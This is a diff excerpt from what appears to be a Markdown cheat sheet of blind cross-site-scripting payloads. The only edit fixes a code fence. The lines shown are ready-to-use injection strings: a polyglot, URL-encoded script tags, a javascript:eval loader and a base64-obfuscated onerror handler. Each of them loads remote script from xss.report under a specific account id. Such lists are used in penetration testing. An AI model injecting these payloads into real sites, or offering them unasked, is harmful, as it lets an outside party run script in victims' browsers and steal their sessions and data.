@@ -60,7 +60,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <script>$.getScript("//xss.report/c/hnterx?12")</script>
 ```
 ### xss.report encoded all payloads
-``
+```
 '%22%3E%3Cscript%20src=https://xss.report/c/hnterx%3E%3C/script%3E
 javascript:eval('var%20a=document.createElement(%5C'script%5C');a.src=%5C'https://xss.report/c/hnterx%5C';document.body.appendChild(a)')
 %22%3E%3Cvideo%3E%3Csource%20onerror=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%3E
